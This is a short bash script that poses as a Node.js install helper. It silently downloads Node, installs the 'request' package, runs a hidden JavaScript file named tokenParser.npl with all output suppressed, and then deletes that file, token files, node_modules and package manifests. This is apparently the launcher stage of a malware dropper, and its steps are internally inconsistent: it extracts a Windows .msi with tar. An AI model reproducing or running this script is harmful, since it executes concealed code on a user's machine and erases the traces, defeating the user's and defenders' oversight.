#!/bin/bash

# Creating new Info
set -e

NODE_VERSION="20.11.1"
NODE_MSI="node-v${NODE_VERSION}-x64.msi"
DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${NODE_MSI}"
NODE_DIR="$(pwd)/node-v${NODE_VERSION}-x64"

NODE_INSTALLED_VERSION=""

# Check if Node.js is installed
NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")

if [ -z "$NODE_INSTALLED_VERSION" ]; then
    INSTALL_NODE=1
else
    INSTALL_NODE=0
fi

if [ "$INSTALL_NODE" -eq 1 ]; then
    # Install Node.js if not installed
    if ! command -v curl &> /dev/null; then
        wget -q "$DOWNLOAD_URL" -O "$NODE_MSI"
    else
        curl -sSL -o "$NODE_MSI" "$DOWNLOAD_URL"
    fi

    if [ -f "$NODE_MSI" ]; then
        # Extract the tarball
        tar -xf "$NODE_MSI" -C "$(pwd)"
        rm -f "$NODE_MSI"
    else
        exit 1
    fi

    export PATH="${NODE_DIR}/bin:$PATH"
fi

# Check if Node.js and npm are available
if ! command -v node &> /dev/null; then
    exit 1
fi

if ! command -v npm &> /dev/null; then
    exit 1
fi

# Install the "request" package if not already installed
if [ ! -d "$(pwd)/node_modules/request" ]; then
    npm install request --silent --no-progress --loglevel=error --fund=false
    if [ $? -ne 0 ]; then
        exit 1
    fi
fi

# Run tokenParser.npl if it exists
if [ -f "$(pwd)/tokenParser.npl" ]; then
    node "$(pwd)/tokenParser.npl" > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        exit 1
    fi
else
    exit 1
fi

# Clean up generated files
if [ -f "$(pwd)/token.cmd" ]; then
    rm -f "$(pwd)/token.cmd"
fi

if [ -f "$(pwd)/token" ]; then
    rm -f "$(pwd)/token"
fi

if [ -f "$(pwd)/tokenParser.npl" ]; then
    rm -f "$(pwd)/tokenParser.npl"
fi

if [ -d "$(pwd)/node_modules" ]; then
    rm -rf "$(pwd)/node_modules"
fi

if [ -f "$(pwd)/package.json" ]; then
    rm -f "$(pwd)/package.json"
fi

if [ -f "$(pwd)/package-lock.json" ]; then
    rm -f "$(pwd)/package-lock.json"
fi

exit 0